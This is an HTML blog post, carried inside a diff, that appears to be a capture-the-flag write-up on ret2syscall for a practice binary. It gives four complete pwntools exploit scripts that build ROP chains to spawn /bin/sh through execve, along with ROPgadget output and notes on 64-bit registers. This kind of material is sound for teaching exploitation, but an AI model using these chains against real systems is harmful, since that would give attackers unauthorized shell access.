@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="This article will record some poc for ret2syscall.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2syscall">
+<meta property="og:url" content="http://example.com/2022/10/13/ret2syscall/index.html">
+<meta property="og:site_name" content="书鱼">
+<meta property="og:description" content="This article will record some poc for ret2syscall.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/10/13/ret2syscall/1.png">
+<meta property="og:image" content="http://example.com/2022/10/13/ret2syscall/2.png">
+<meta property="og:image" content="http://example.com/2022/10/13/ret2syscall/3.png">
+<meta property="og:image" content="http://example.com/2022/10/13/ret2syscall/4.png">
+<meta property="og:image" content="http://example.com/2022/10/13/ret2syscall/5.png">
+<meta property="og:image" content="http://example.com/2022/10/13/ret2syscall/6.png">
+<meta property="article:published_time" content="2022-10-12T17:28:46.000Z">
+<meta property="article:modified_time" content="2022-12-13T02:01:20.550Z">
+<meta property="article:author" content="Bkfish">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/10/13/ret2syscall/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ret2syscall</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/10/23/pwn-fmt/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/03/20/2022%E8%99%8E%E7%AC%A6ezphp%E5%AE%8C%E6%95%B4%E8%BF%87%E7%A8%8B/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/13/ret2syscall/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/13/ret2syscall/&text=ret2syscall"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/13/ret2syscall/&title=ret2syscall"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/13/ret2syscall/&is_video=false&description=ret2syscall"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ret2syscall&body=Check out this article: http://example.com/2022/10/13/ret2syscall/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/13/ret2syscall/&title=ret2syscall"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/13/ret2syscall/&title=ret2syscall"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/13/ret2syscall/&title=ret2syscall"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/13/ret2syscall/&title=ret2syscall"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/13/ret2syscall/&name=ret2syscall&description=&lt;p&gt;This article will record some poc for ret2syscall.&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/13/ret2syscall/&t=ret2syscall"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#32bits"><span class="toc-number">1.</span> <span class="toc-text">32bits</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#find-hole"><span class="toc-number">1.1.</span> <span class="toc-text">find hole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc1"><span class="toc-number">1.2.</span> <span class="toc-text">poc1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc2"><span class="toc-number">1.3.</span> <span class="toc-text">poc2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc3"><span class="toc-number">1.4.</span> <span class="toc-text">poc3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc4"><span class="toc-number">1.5.</span> <span class="toc-text">poc4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64bits"><span class="toc-number">2.</span> <span class="toc-text">64bits</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#what-we-need-do"><span class="toc-number">2.1.</span> <span class="toc-text">what we need do</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ret2syscall
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Bkfish</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-10-12T17:28:46.000Z" class="dt-published" itemprop="datePublished">2022-10-13</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Pwn/">Pwn</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>This article will record some poc for ret2syscall.</p>
+<span id="more"></span>
+
+<p>Demo question can be downloaded here </p>
+<h2 id="32bits"><a href="#32bits" class="headerlink" title="32bits"></a>32bits</h2><p><a href="rop" title="rop">ropfile</a></p>
+<h3 id="find-hole"><a href="#find-hole" class="headerlink" title="find hole"></a>find hole</h3><p>firstly use checksec file,the NX is enabled,so we can’t use ret2shellcode or ret2text.<br><img src="/2022/10/13/ret2syscall/1.png"><br>check the elf is vulnerable ,and can easily find stack overflow.<br><img src="/2022/10/13/ret2syscall/2.png"><br>and use gdb can get the overflow size is 0x6c</p>
+<h3 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h3><p>we find the string of “&#x2F;bin&#x2F;sh”</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bkfish@ubuntu:/tmp$ ROPgadget --binary rop --string &#x27;/bin/sh&#x27;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>
+<p>so we just use sys_execve(“&#x2F;bin&#x2F;sh”,NULL,NULL) to system call</p>
+<p>in this web we can find every system call number and param, <a target="_blank" rel="noopener" href="https://syscalls32.paolostivanin.com/">https://syscalls32.paolostivanin.com/</a>,for example execve<br><img src="/2022/10/13/ret2syscall/3.png"><br>so we need find shellcode of “int 0x80” address is 0x08049421</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bkfish@ubuntu:/tmp$ ROPgadget --binary rop --only &#x27;int&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure>
+<p>then set </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eax 0xb</span><br><span class="line">ebx  address of &quot;/bin/sh&quot;</span><br><span class="line">ecx 0</span><br><span class="line">edx 0</span><br></pre></td></tr></table></figure>
+<p>we can use gadget to seek. for example eax</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bkfish@ubuntu:/tmp$ ROPgadget --binary rop --only &#x27;pop|ret&#x27; |grep &#x27;eax&#x27;</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">bkfish@ubuntu:/tmp$ ROPgadget --binary rop --only &#x27;pop|ret&#x27; |grep &#x27;ebx&#x27;</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+
+<p>so we can write the poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal=[&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line">pop_eax=<span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx=<span class="number">0x0806eb90</span></span><br><span class="line">addr_bin_sh=<span class="number">0x080be408</span></span><br><span class="line">int_80=<span class="number">0x08049421</span></span><br><span class="line">sh=process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x80485c0&#x27;)</span></span><br><span class="line"><span class="comment">#payload=flat([&#x27;A&#x27;*0x6c+&#x27;bbbb&#x27;,pop_eax,0xb,pop_edx_ecx_ebx,0,0,addr_bin_sh,int_80])</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+<span class="string">&#x27;bbbb&#x27;</span>+p32(pop_eax)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(addr_bin_sh)+p32(int_80)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h3><p>another rop chain</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bkfish@ubuntu:/tmp$ ROPgadget --binary rop --only &#x27;pop|ret&#x27; |grep &#x27;eax&#x27;</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">bkfish@ubuntu:/tmp$ ROPgadget --binary rop --only &#x27;pop|ret&#x27; |grep &#x27;edx&#x27;</span><br><span class="line">0x0806eb6a : pop edx ; ret</span><br><span class="line">bkfish@ubuntu:/tmp$ ROPgadget --binary rop --only &#x27;pop|ret&#x27; |grep &#x27;ecx&#x27;</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pop_eax=<span class="number">0x080bb196</span></span><br><span class="line">pop_edx=<span class="number">0x0806eb6a</span></span><br><span class="line">pop_ecx_ebx=<span class="number">0x0806eb91</span></span><br><span class="line">addr_bin_sh=<span class="number">0x080be408</span></span><br><span class="line">int_80=<span class="number">0x08049421</span></span><br><span class="line">sh=process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal=[&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x08048E9B&#x27;)</span></span><br><span class="line"><span class="comment">#payload=flat([&#x27;A&#x27;*0x6c+&#x27;bbbb&#x27;,pop_eax,0xb,pop_edx_ecx_ebx,0,0,addr_bin_sh,int_80])</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+<span class="string">&#x27;bbbb&#x27;</span>+p32(pop_eax)+p32(<span class="number">0xb</span>)+p32(pop_edx)+p32(<span class="number">0</span>)+p32(<span class="number">0x0806eb91</span>)+p32(<span class="number">0</span>)+p32(addr_bin_sh)+p32(int_80)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="poc3"><a href="#poc3" class="headerlink" title="poc3"></a>poc3</h3><p>The ROPgadget can auto generate the rop chain</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --ropchain</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/13/ret2syscall/4.png"><br>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">sh=process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806eb6a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080bb196</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0809a4ad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806eb6a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080bb196</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0809a4ad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806eb6a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08054590</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0809a4ad</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806eb91</span>) <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806eb6a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08054590</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b5bf</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049421</span>) <span class="comment"># int 0x80</span></span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>is so interesting</p>
+<h3 id="poc4"><a href="#poc4" class="headerlink" title="poc4"></a>poc4</h3><p>if we can’t find string “&#x2F;bin&#x2F;sh”,how can we pwn it?<br>we can read string “&#x2F;bin&#x2F;sh” as buf ,the use this buf as param to system call exe.<br>so we find how to read string as buf.<br><img src="/2022/10/13/ret2syscall/5.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eax 0x3</span><br><span class="line">ebx 0</span><br><span class="line">ecx address of buf</span><br><span class="line">edx 0x10</span><br></pre></td></tr></table></figure>
+<p>but if we use <code>ROPgadget --binary rop --only &#39;int&#39;</code> to system call,we can juet use once it.<br>so if we want system call  multiple times,we need use opcode.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bkfish@ubuntu:/tmp$ ROPgadget --binary rop --opcode cd80c3</span><br><span class="line">Opcodes information</span><br><span class="line">============================================================</span><br><span class="line">0x0806f230 : cd80c3</span><br></pre></td></tr></table></figure>
+<p>we can see the  “opcode cd80c3”(0x0806f230)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0806F230                 int     80h           </span><br><span class="line">.text:0806F232                 retn</span><br></pre></td></tr></table></figure>
+<p>this it so comfortable for system call<br>so the final exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pop_eax=<span class="number">0x080bb196</span></span><br><span class="line">pop_edx=<span class="number">0x0806eb6a</span></span><br><span class="line">pop_ecx_ebx=<span class="number">0x0806eb91</span></span><br><span class="line">pop_bin_sh=<span class="number">0x080be408</span></span><br><span class="line">int_80=<span class="number">0x0806f230</span></span><br><span class="line">sh=process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">buf=elf.bss()+<span class="number">0x300</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+<span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">payload=payload+p32(pop_eax)+p32(<span class="number">0x3</span>)+p32(pop_edx)+p32(<span class="number">0x10</span>)+p32(pop_ecx_ebx)+p32(buf)+p32(<span class="number">0</span>)+p32(int_80)</span><br><span class="line"></span><br><span class="line"><span class="comment">#exec</span></span><br><span class="line">payload=payload+p32(pop_eax)+p32(<span class="number">0xb</span>)+p32(pop_edx)+p32(<span class="number">0x0</span>)+p32(pop_ecx_ebx)+p32(<span class="number">0</span>)+p32(buf)+p32(int_80)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sh.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/13/ret2syscall/6.png"></p>
+<h2 id="64bits"><a href="#64bits" class="headerlink" title="64bits"></a>64bits</h2><h3 id="what-we-need-do"><a href="#what-we-need-do" class="headerlink" title="what we need do"></a>what we need do</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$rax==59</span><br><span class="line">$rdi==“/bin/sh”</span><br><span class="line">$rsi==0</span><br><span class="line">$rdx==0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
